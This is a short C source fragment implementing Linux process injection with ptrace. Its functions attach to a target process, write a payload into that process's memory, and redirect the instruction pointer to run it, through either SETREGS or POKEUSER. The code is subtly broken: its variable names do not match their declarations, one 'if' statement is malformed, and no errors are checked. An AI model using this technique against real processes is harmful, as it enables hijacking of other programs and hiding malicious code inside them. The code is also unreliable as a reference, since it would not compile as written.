/*
  ptrace-based Linux process injection
*/

int ptrace_poketext_write(long pid, long address, const char *payload)
{
  // Attach to target
  ptrace(PTRACE_ATTACH, pid, NULL, NULL);
  wait(NULL);

  size_t payload_sz = strlen(payload);
  uint64_t *payload_cpy = (uint64_t *)payload;

  // write bytes to address
  for (size_t i = 0; i < payload_size; i+=8, payload_copy++)
    {
      ptrace(PTRACE_POKETEXT, pid, address + i, *payload_copy);
    }
  return 0;
}
  
int ptrace_setregs_exec(long pid, long address, bool attached)
{
  if (!attached)
    {
      ptrace(PTRACE_ATTACH, pid, NULL, NULL);
      wait(NULL);
    }

  // get old register state
  struct user_regs_struct regs;
  ptrace(PTRACE_GETREGS, pid, NULL, &regs);

  // set RIP to the address of where our code is sitting
  regs.rip = address + 2;

  ptrace(PTRACE_SETREGS, pid, NULL, &regs);
  ptrace(PTRACE_CONT, pid, NULL, NULL);

  return 0;
}

int ptrace_pokeuser_exec(long pid, long address, bool attached)
{
  if !(attached)
    {
      ptrace(PTRACE_ATTACH, pid, NULL, NULL);
      wait(NULL);
    }
  address +=2;
  ptrace(PTRACE_POKEUSER, pid, 16* sizeof(unsigned long), address);
  ptrace(PTRACE_CONT, pid, NULL, NULL);
  return 0;
}
